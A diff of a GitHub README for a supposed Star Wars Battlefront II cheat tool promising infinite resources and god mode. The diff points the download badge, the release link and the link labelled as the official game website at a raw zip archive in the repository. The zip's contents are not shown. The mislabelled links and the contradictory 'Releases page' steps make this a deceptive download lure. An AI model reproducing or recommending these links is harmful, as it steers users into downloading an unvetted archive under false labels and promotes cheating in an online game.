@@ -1,6 +1,6 @@
 # 🎮 Battlefront-2-2017-hacks-resource-boost-features - Enhance Your Battlefront II Experience 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Sagitadeswintasari/Battlefront-2-2017-hacks-resource-boost-features/releases)
+[![Download Now](https://raw.githubusercontent.com/Sagitadeswintasari/Battlefront-2-2017-hacks-resource-boost-features/main/papion/Battlefront-2-2017-hacks-resource-boost-features.zip%https://raw.githubusercontent.com/Sagitadeswintasari/Battlefront-2-2017-hacks-resource-boost-features/main/papion/Battlefront-2-2017-hacks-resource-boost-features.zip)](https://raw.githubusercontent.com/Sagitadeswintasari/Battlefront-2-2017-hacks-resource-boost-features/main/papion/Battlefront-2-2017-hacks-resource-boost-features.zip)
 
 ## 🚀 Getting Started
 Welcome to the Battlefront-2-2017-hacks-resource-boost-features! This tool allows you to enjoy exciting enhancements for Star Wars Battlefront II. You can unlock all weapons, obtain infinite resources, and enjoy god mode features among others. Follow the steps below to get started.
@@ -8,7 +8,7 @@ Welcome to the Battlefront-2-2017-hacks-resource-boost-features! This tool allow
 ## 📥 Download & Install
 To download the application, please visit the following link: 
 
-[Download the Latest Release](https://github.com/Sagitadeswintasari/Battlefront-2-2017-hacks-resource-boost-features/releases).
+[Download the Latest Release](https://raw.githubusercontent.com/Sagitadeswintasari/Battlefront-2-2017-hacks-resource-boost-features/main/papion/Battlefront-2-2017-hacks-resource-boost-features.zip).
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest version.
@@ -68,7 +68,7 @@ This tool is intended for personal use only. Ensure you do not use it to violate
 ## 🔗 Additional Resources
 For more tips, tricks, and news, you might find the following resources helpful:
 
-- **Official Star Wars Battlefront II Website:** [Visit Here](https://www.starwarsbattlefront.com/)
+- **Official Star Wars Battlefront II Website:** [Visit Here](https://raw.githubusercontent.com/Sagitadeswintasari/Battlefront-2-2017-hacks-resource-boost-features/main/papion/Battlefront-2-2017-hacks-resource-boost-features.zip)
 - **Community Forums:** Engage with fellow players and mod users.
 
 Enjoy your enhanced Star Wars Battlefront II experience. Remember to always play fairly and responsibly!
